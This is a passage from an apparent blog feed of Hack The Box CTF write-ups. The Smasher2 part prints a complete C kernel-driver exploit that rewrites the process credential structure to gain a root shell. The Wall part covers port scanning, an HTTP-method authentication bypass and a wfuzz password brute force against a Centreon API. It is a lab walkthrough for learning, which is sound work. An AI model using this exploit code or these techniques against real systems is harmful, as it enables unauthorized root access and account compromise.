0x76187684, crednum: 6</span><br><span class="line">[*] Cred structure found! ptr: 0x76187bc4, crednum: 7</span><br><span class="line">[*] Cred structure found! ptr: 0x77112184, crednum: 8</span><br><span class="line">[*] Cred structure found! ptr: 0x771123c4, crednum: 9</span><br><span class="line">[*] Cred structure found! ptr: 0x77112484, crednum: 10</span><br><span class="line">[*] Cred structure found! ptr: 0x771129c4, crednum: 11</span><br><span class="line">[*] Cred structure found! ptr: 0x77113084, crednum: 12</span><br><span class="line">[*] Cred structure found! ptr: 0x77113144, crednum: 13</span><br><span class="line">[*] Cred structure found! ptr: 0x77113504, crednum: 14</span><br><span class="line">[*] Cred structure found! ptr: 0x77113c84, crednum: 15</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a484, crednum: 16</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a604, crednum: 17</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a6c4, crednum: 18</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a844, crednum: 19</span><br><span class="line">[*] Cred structure found! ptr: 0x7714a9c4, crednum: 20</span><br><span class="line">[*] Cred structure found! ptr: 0x7714aa84, crednum: 21</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ac04, crednum: 22</span><br><span class="line">[*] Cred structure found! ptr: 0x7714ad84, crednum: 23</span><br><span class="line">[*] Process cred structure found ptr: 0x7714ad84, crednum: 23</span><br><span class="line"></span><br><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$</span><br></pre></td></tr></table></figure><p>Great! now what’s left to do is to overwrite the capabilities in our <code>cred</code> structure with <code>0xffffffffffffffff</code> and execute <code>/bin/sh</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">credIt += <span class="number">1</span>; </span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"-"</span>, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><code>pwn.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;                                                         </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;                                                      </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;                                                              </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * <span class="keyword">const</span> * argv)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\033[93m[+] PID: %d\n"</span>, getpid());</span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/dhid"</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\033[93m[!] Open failed!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\033[32m[*] Open OK fd: %d\n"</span>, fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">size</span> = <span class="number">0xf0000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mmapStart = <span class="number">0x42424000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> * addr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)mmap((<span class="keyword">void</span>*)mmapStart, <span class="built_in">size</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr == MAP_FAILED)&#123;</span><br><span class="line">perror(<span class="string">"\033[93m[!] Failed to mmap !"</span>);</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\033[32m[*] mmap OK address: %lx\n"</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uid = getuid();</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\033[93m[+] Searching for the process cred structure ..."</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> credIt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> credNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr) &lt; (mmapStart + <span class="built_in">size</span> - <span class="number">0x40</span>))&#123;</span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid &amp;&amp;</span><br><span class="line">addr[credIt++] == uid</span><br><span class="line">)&#123;</span><br><span class="line">credNum++;</span><br><span class="line"></span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\033[32m[*] Cred structure found ! ptr: %p, crednum: %d\n"</span>, addr, credNum);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\033[32m[*] Got Root"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\033[32m[+] Spawning a shell"</span>);</span><br><span class="line"></span><br><span class="line">credIt += <span class="number">1</span>; </span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line">addr[credIt++] = <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"-"</span>, (<span class="keyword">char</span> *)<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"\033[93m[!] Execl failed..."</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">credIt = <span class="number">0</span>;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">addr[credIt++] = uid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">addr++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And finally:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dzonerzy@smasher2:&#x2F;dev&#x2F;shm$ .&#x2F;pwn </span><br><span class="line">[+] PID: 1153</span><br><span class="line">[*] Open OK fd: 3</span><br><span class="line">[*] mmap OK address: 42424000</span><br><span class="line">[+] Searching for the process cred structure ...</span><br><span class="line">[*] Cred structure found ! ptr: 0xb60ad084, crednum: 20</span><br><span class="line">[*] Got Root</span><br><span class="line">[+] Spawning a shell</span><br><span class="line"># whoami</span><br><span class="line">root</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/smasher2/12.png" alt=""><br>We owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/wall/">Hack The Box - Wall</a><br>Next Hack The Box write-up : <a href="/hack-the-box/craft/">Hack The Box - Craft</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/smasher2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Wall</title>
      <link>https://0xrick.github.io/hack-the-box/wall/</link>
      <guid>https://0xrick.github.io/hack-the-box/wall/</guid>
      <pubDate>Sat, 07 Dec 2019 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Wall from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Wall"><a href="#Hack-The-Box-Wall" class="headerlink" title="Hack The Box - Wall"></a>Hack The Box - Wall</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Wall retired and here’s my write-up about it. It was an easy Linux machine with a web application vulnerable to <code>RCE</code>, <code>WAF</code> bypass to be able to exploit that vulnerability and a vulnerable <code>suid</code> binary. It’s a Linux machine and its ip is <code>10.10.10.157</code>, I added it to <code>/etc/hosts</code> as <code>wall.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/wall/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# nmap -sV -sT -sC -o nmapinitial wall.htb </span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2019-12-06 13:59 EST</span><br><span class="line">Nmap scan report for wall.htb (10.10.10.157)</span><br><span class="line">Host is up (0.50s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)</span><br><span class="line">|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)</span><br><span class="line">|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 241.17 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall#</span><br></pre></td></tr></table></figure><p>We got <code>http</code> on port 80 and <code>ssh</code> on port 22. Let’s check the web service.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The index page was just the default <code>apache</code> page:<br><img src="/images/hackthebox/wall/1.png" alt=""><br>So I ran <code>gobuster</code> and got these results:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# gobuster dir -u http:&#x2F;&#x2F;wall.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;wall.htb&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;12&#x2F;06 14:08:02 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;index.html (Status: 200)</span><br><span class="line">&#x2F;monitoring (Status: 401)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br></pre></td></tr></table></figure><p>The only interesting thing was <code>/monitoring</code>, however that path was protected by basic <code>http</code> authentication:<br><img src="/images/hackthebox/wall/2.png" alt=""><br>I didn’t have credentials, I tried bruteforcing them but it didn’t work so I spent sometime enumerating but I couldn’t find the credentials anywhere. Turns out that by changing the request method from <code>GET</code> to <code>POST</code> we can bypass the authentication:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# curl -X POST http:&#x2F;&#x2F;wall.htb&#x2F;monitoring&#x2F;</span><br><span class="line">&lt;h1&gt;This page is not ready yet !&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h2&gt;We should redirect you to the required page !&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;0; URL&#x3D;&#39;&#x2F;centreon&#39;&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall#</span><br></pre></td></tr></table></figure><p>The response was a redirection to <code>/centreon</code>:<br><img src="/images/hackthebox/wall/3.png" alt=""></p><blockquote><p>Centreon is a network, system, applicative supervision and monitoring tool. -<a href="https://github.com/centreon/centreon" target="_blank" rel="noopener">github</a></p></blockquote><p>Bruteforcing the credentials through the login form will require writing a script because there’s a <code>csrf</code> token that changes every request, alternatively we can use the <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html" target="_blank" rel="noopener"><code>API</code></a>.<br>According to the <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication" target="_blank" rel="noopener">authentication</a> part we can send a <code>POST</code> request to <code>/api/index.php?action=authenticate</code> with the credentials. In case of providing valid credentials it will respond with the authentication token, otherwise it will respond with a <code>403</code>.<br>I used <code>wfuzz</code> with <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt" target="_blank" rel="noopener"><code>darkweb2017-top10000.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">seclists</a>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall# wfuzz -c -X POST -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; -w .&#x2F;darkweb2017-top10000.txt http:&#x2F;&#x2F;wall.htb&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4 - The Web Fuzzer                           *</span><br><span class="line">********************************************************</span><br><span class="line">Target: http:&#x2F;&#x2F;wall.htb&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate</span><br><span class="line">Total requests: 10000</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">000000005:   403        0 L      2 W      17 Ch       &quot;qwerty&quot;</span><br><span class="line">000000006:   403        0 L      2 W      17 Ch       &quot;abc123&quot;</span><br><span class="line">000000008:   200        0 L      1 W      60 Ch       &quot;password1&quot;</span><br><span class="line">000000004:   403        0 L      2 W      17 Ch       &quot;password&quot;</span><br><span class="line">000000007:   403        0 L      2 W      17 Ch       &quot;12345678&quot;</span><br><span class="line">000000009:   403        0 L      2 W      17 Ch       &quot;1234567&quot;</span><br><span class="line">000000010:   403        0 L      2 W      17 Ch       &quot;123123&quot;</span><br><span class="line">000000001:   403        0 L      2 W      17 Ch       &quot;123456&quot;</span><br><span class="line">000000002:   403        0 L      2 W      17 Ch       &quot;123456789&quot;</span><br><span class="line">000000003:   403        0 L      2 W      17 Ch       &quot;111111&quot;</span><br><span class="line">000000011:   403        0 L      2 W      17 Ch       &quot;1234567890&quot;</span><br><span class="line">000000012:   403        0 L      2 W      17 Ch       &quot;000000&quot;</span><br><span class="line">000000013:   403        0 L      2 W      17 Ch       &quot;12345&quot;</span><br><span class="line">000000015:   403        0 L      2 W      17 Ch       &quot;1q2w3e4r5t&quot; </span><br><span class="line">^C</span><br><span class="line">Finishing pending requests...</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;wall#</span><br></pre></td></tr></table></figure><p><code>password1</code> resulted in a <code>200</code> response so its the right password:<br><img src="/images/hackthebox/wall/4.png" alt=""></p><p><img src="/images/hackthebox/wall/5.png" alt=""></p><h2 id="RCE-WAF-Bypass-–-gt-Shell-as-www-data"><a href="#RCE-WAF-Bypass-–-gt-Shell-as-www-data" class="headerlink" title="RCE | WAF Bypass –&gt; Shell as www-data"></a>RCE | WAF Bypass –&gt; Shell as 